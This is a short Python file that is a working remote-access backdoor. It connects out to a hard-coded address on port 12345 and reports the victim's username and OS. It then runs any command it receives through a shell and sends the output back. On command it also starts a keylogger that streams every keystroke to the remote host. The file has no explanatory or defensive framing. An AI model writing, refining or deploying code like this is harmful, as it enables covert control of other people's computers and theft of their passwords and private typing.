import socket
import threading
from pynput import keyboard
from getpass import getuser
import os
import subprocess
import platform

get_os = platform.uname()
get_user = getuser()
os_info = f"client_name : {get_user} <-> client_os : {get_os}"

IP = "169.254.5.254"
PORT = 12345

def keylogger_send_data(connection, stop_event):
    def on_press(key):
        try:
            connection.sendall(f"{key.char},".encode())
        except AttributeError:
            try:
                connection.sendall(f"[{key}],".encode())
            except Exception:
                pass
        except ConnectionResetError:
            pass

    with keyboard.Listener(on_press=on_press) as listener:
        try:
            while not stop_event.is_set():
                listener.join(0.1)
        except Exception:
            pass

try:
    connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    connection.connect((IP, PORT))
    connection.send(os_info.encode())

    while True:
        try:
            receiver = connection.recv(1024).decode()

            if receiver.lower() == "quit":
                break
            elif receiver.lower() == "keylogger":
                stop_event = threading.Event()
                keylogger_thread = threading.Thread(target=keylogger_send_data, args=(connection, stop_event))
                keylogger_thread.start()

                try:
                    while True:
                        if stop_event.is_set():
                            break
                finally:
                    stop_event.set()
                    keylogger_thread.join()
            elif receiver[:2] == "cd":
                try:
                    os.chdir(receiver[3:])
                    connection.send(f"Changed directory to: {os.getcwd()}".encode())
                except FileNotFoundError:
                    connection.send(f"Directory not found: {receiver[3:]}".encode())
            else:
                try:
                    output = subprocess.check_output(receiver, shell=True, stderr=subprocess.STDOUT, text=True)
                    if not output.strip():
                        output = "Command executed but no output."
                except subprocess.CalledProcessError as e:
                    output = f"Command failed: {e.output}"

                connection.send(output.encode())

        except ConnectionResetError:
            pass
        except KeyboardInterrupt:
            pass
        except Exception:
            pass

finally:
    try:
        connection.close()
    except Exception:
        pass
